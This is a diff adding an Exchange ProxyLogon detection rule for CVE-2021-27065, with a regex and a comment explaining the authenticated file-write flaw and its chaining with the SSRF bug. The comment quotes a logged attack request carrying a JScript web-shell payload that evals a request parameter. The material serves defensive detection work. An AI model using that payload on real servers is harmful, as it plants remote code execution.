@@ -39,4 +39,17 @@ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-se
         <description>Possible ProxyLogon vulnerability exploitation</description>
     </rule>
 
+<!--
+Sample: 2021-04-06T14:54:38.677Z,WIN-03FGEGKLSPR,ECP.Request,"S:TIME=4365;S:SID=3a5d3a0b-a544-4d5c-9b1d-3d33d4968b48;'S:CMD=Set-OabVirtualDirectory.ExternalUrl=''http://o/#<script language=""JScript"" runat=""server"">function Page_Load(){eval(Request[""eVIL""],""unsafe"");}</script>''.Identity=''87fc3593-ca62-4d08-93bd-7882275d33c1''';S:REQID=;S:URL=/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=MALCODEmOnE.&a=%5D:444/ecp/lkO.js;S:EX=;S:ACTID=c3f8f7e0-9817-46da-9ed4-fe575da51fbd;S:RS=0;S:BLD=15.0.847.32"
+
+CVE-2021-27065  is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate
+with the Exchange server then they could use this vulnerability to write a file to any path on the server.
+They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate
+admin’s credentials.
+-->
+    <rule id="61647" level="12">
+        <regex type="pcre2">Set-.+VirtualDirectory.+?Url.+\<\w+.*\>.*?\<\/\w+\>.+?VirtualDirectory</regex>
+        <description>MS Exchange - Possible ProxyLogon vulnerability exploitation (CVE-2021-27065)</description>
+    </rule>
+
 </group>
